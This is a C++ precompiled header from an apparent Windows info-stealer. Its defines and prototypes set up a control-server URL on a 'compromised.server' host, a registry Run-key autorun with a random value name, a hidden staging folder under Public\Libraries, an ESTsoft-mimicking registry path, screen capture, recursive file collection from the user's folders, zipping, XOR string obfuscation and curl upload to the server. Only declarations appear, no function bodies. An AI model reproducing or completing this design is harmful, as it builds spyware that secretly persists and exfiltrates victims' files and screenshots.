// pch.h: This is a precompiled header file.
// Files listed below are compiled only once, improving build performance for future builds.
// This also affects IntelliSense performance, including code completion and many code browsing features.
// However, files listed here are ALL re-compiled if any one of them is updated between builds.
// Do not add files here that you will be updating frequently as this negates the performance advantage.

#ifndef PCH_H
#define PCH_H



#pragma warning(disable: 4819)	// warning C4819: The file contains a character that cannot be represented in the current code page (949). Save the file in Unicode format to prevent data loss
#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <tchar.h>
#include <stdlib.h>
#include <iostream>
#include <Windows.h>
#include <regex>
#include <Psapi.h>
#include <regex>
#include "libpng/png.h"
#include <fstream>
#include <chrono>
#include <thread>
#include <filesystem>
#include <ShlObj.h>
#include "libzippp/libzippp.h"
#include <sstream>
#include "curl/curl.h"
#include <cstdio>
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "CRYPT32.lib")
#pragma comment(lib, "Normaliz.lib")
namespace fs = std::filesystem;

#define SERVER_CONTROL_PAGE "http://compromised.server/control/control.php"
#define AUTORUN_PATH "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define AUTORUN_VALUE "a2McCq"
#define SAVE_PATH "C:\\Users\\Public\\Libraries\\"
#define COLLECT_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr"
#define ZIP_PATH "C:\\Users\\Public\\Libraries\\vpllrvyrfgolr.zip"
#define TEST_MODE "SOFTWARE\\test"
#define TEST_VALUE "TEST_MODE"
#define SERVER_CONTROL_PAGE "http://compromised.server/control/control.php?"
#define UID_PATH "SOFTWARE\\ESTsoft"
#define UID_VALUE "update"

/*
0x00 : CSIDL_DESKTOP
0x05 : CSIDL_PERSONAL
0x0D : CSIDL_MYMUSIC
0x0E : CSIDL_MYVIDEO
*/

// When you are using pre-compiled headers, this source file is necessary for compilation to succeed.

int entry_point();
bool is_ipv4(const std::string& str);
bool get_proc_name(std::string& proc_name);
bool register_autorun(std::string proc_name);
std::string get_local_time();
void capture_screen();
void save_file(const fs::path& file_path, const fs::path& save_dir);
void enumerate_reculsively(const fs::path& dir_path, const fs::path& save_dir);
bool collect_files();
bool zip_dir();
bool check_test_mode();
std::string mb_to_utf8(const std::string& mbstr);
bool send_to_server(std::string file_path);
std::string xor_string(const std::string& str, char key);
static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp);
// add headers that you want to pre-compile here
#include "framework.h"

#endif //PCH_H
